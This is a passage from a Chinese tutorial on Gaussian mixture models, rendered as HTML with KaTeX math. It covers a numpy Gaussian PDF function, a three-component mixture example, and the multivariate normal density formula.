aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span> 时分布形态的变化：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f1a00a83f7d499ca2e14a4e10994b03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=jN7U7uJXyvTU0yi7FdLBX82fFk4%3D" alt="c2.jpg" loading="lazy"/></p>
<p>用python实现这个高斯分布函数也非常简单，如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">def</span> <span class="hljs-title function_">gaussian_pdf_compact</span>(<span class="hljs-params">x, mu, sigma</span>):
    <span class="hljs-keyword">return</span> np.exp(-<span class="hljs-number">0.5</span> * ((x - mu) / sigma) ** <span class="hljs-number">2</span>) / (sigma * np.sqrt(<span class="hljs-number">2</span> * np.pi))
</code></pre>
<p>现在，考虑下面这样的概率密度函数，你能否识别它属于哪种已知分布？或者，你能写出它的概率密度函数表达式<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span>吗？</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8835392a835f40fe94ff466dda90c1eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=bFhfGky%2BTocSiM5FI6zVtMPwD1w%3D" alt="c3.jpg" width="70%" loading="lazy"/></p>
<p>显然，这并不是我们常见的单一概率分布（如泊松分布、均匀分布等），而是一个形态复杂的非标准概率密度函数。然而，有趣的是，这个函数实际上是由三个不同的高斯分布（正态分布）经过加权叠加而成的。具体来说，它的数学表达式可以写为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>×</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>∣</mo><mo>−</mo><mn>2.5</mn><mo separator="true">,</mo><mn>0.9</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>×</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>∣</mo><mn>0.3</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>×</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>∣</mo><mn>2.9</mn><mo separator="true">,</mo><mn>1.2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x) = \frac{1}{3} \times \mathcal{N}(x \mid -2.5,0.9) + \frac{1}{3} \times \mathcal{N}(x \mid0.3,2) + \frac{1}{3} \times \mathcal{N}(x \mid 2.9,1.2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">−</span><span class="mord">2.5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">2.9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.2</span><span class="mclose">)</span></span></span></span></span></div>
<p>其中，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>∣</mo><mi>μ</mi><mo separator="true">,</mo><mi>σ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(x \mid \mu,\sigma)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">μ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mclose">)</span></span></span></span></span>表示均值为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">μ</span></span></span></span></span>，标准差为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span>的高斯分布概率密度函数。下图直观展示了这三个高斯分量(虚线)以及它们叠加后的总密度函数(蓝色实线)</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7cfa5784f6d46fd81f01c85138dc7bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=Ym%2FI69KxLpc%2Bm2lelUZPzkVViq8%3D" alt="c4.jpg" loading="lazy"/></p>
<p>通过这个例子，我们自然会产生一个猜想：是否任意复杂的概率密度函数都可以用多个高斯分布的加权和来近似表示？或者换个说法，是否任何概率密度函数都可以分解为若干个高斯分布的线性组合？</p>
<p>答案是肯定的，这在理论上有着坚实的基础。实际上，只要有足够多的高斯分布通过适当加权，就可以以任意精度逼近任何平滑的概率密度函数。这正是混合高斯模型（Gaussian Mixture Model, GMM）的核心思想。<strong>混合高斯模型，或者说GMM聚类，它就是一个将任意概率密度函数分解成多个高斯分布的算法。</strong></p>
<p>但是，请不要忘记，概率密度函数并不仅限于一维数据。上面所展示的例子都是关于<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>的密度函数，因为只有一个变量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>，因此它们都是一维的概率密度函数。如果有多个变量，是二维，三维，甚至是更高的维度的概率密度函数，那么我们如何将其分解为多个高斯分布的混合呢？我们先不用看的那么远，不妨先想想，二维的高斯分布长啥样，三维的高斯分布又长啥样？它们公式又该怎么写呢？</p>
<p>下面的图像展示了一个典型的<strong>二维高斯分布（二元正态分布）</strong> 的概率密度曲面图。它是一个平滑的<strong>钟形曲面</strong>，其峰值位于均值点 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>μ</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>μ</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\mu_1,\mu_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 处。曲面的“形状”由协方差矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span></span></span></span></span> 决定。下图清晰地展示了这种对称的钟形结构：</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f44c7b795647428ba26df6a485c71c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=zrIgik%2FjqIk1W%2BinfWN1DrdvNYI%3D" alt="c5.jpg" loading="lazy"/></p>
<p>对于三维高斯分布，在三维空间中完整可视化概率密度函数较为困难，因此常用<strong>三维点云图</strong>来近似表示其分布形态。在下图中，每个点的位置代表一个三维样本，颜色或密度表示该点出现的概率大小。可以看到，样本点密集地分布在均值点附近，并随着距离增加而逐渐稀疏，整体形状大致呈椭球状。这个椭球的朝向与伸展程度，完全由三维协方差矩阵的特征向量和特征值决定。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dadd805da54545d9a59d0d19beb99003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=gmE8R2Hv3oJLnvsjPocfIcGoxXo%3D" alt="c6.jpg" loading="lazy"/></p>
<p>因此，在数学上，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维高斯分布（多元正态分布）的概率密度函数定义为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mi mathvariant="normal">∣</mi><mi mathvariant="bold-italic">μ</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>2</mn><mi>π</mi><msup><mo stretchy="false">)</mo><mfrac><mi>n</mi><mn>2</mn></mfrac></msup><mi mathvariant="normal">∣</mi><mi mathvariant="normal">Σ</mi><msup><mi mathvariant="normal">∣</mi><mn>0.5</mn></msup></mrow></mfrac><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><mo>−</mo><mfrac><mrow><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>−</mo><mi mathvariant="bold-italic">μ</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><msup><mi mathvariant="normal">Σ</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>−</mo><mi mathvariant="bold-italic">μ</mi><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x}|\boldsymbol{\mu},\Sigma ) = \frac{1}{(2\pi)^{\frac{n}{2} }|\Sigma|^{0.5}}\exp(-\frac{(\mathbf{x}-\boldsymbol{\mu})^{T}\Sigma^{-1}(\mathbf{x}-\boldsymbol{\mu})}{2} )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mord">∣</span><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">Σ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.491em;vertical-align:-0.9726em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.2774em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8326em;"><span style="top:-3.3486em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6915em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span><span class="mord">∣Σ</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0.5</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9726em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">exp</span><span class="mopen">(</span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span></span></span></div>
<p>初次见到这个公式可能会觉得复杂，但我们可以这样理解：它本质上是一个多元函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x_1, x_2, \dots, x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，其核心结构仍与一维高斯分布相似，只是将标量均值 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">μ</span></span></span></span></span> 扩展为均值向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">μ</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span></span></span></span></span>，并将方差 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>σ</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\sigma^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 推广为协方差矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span></span></span></span></span>。</p>
<p>式中各符号的含义如下：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">x</mi></mrow><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">x</span></span></span></span></span> 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维数据向量，形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，表示一个观测样本；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">μ</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span></span></span></span></span> 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 维均值向量，形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span 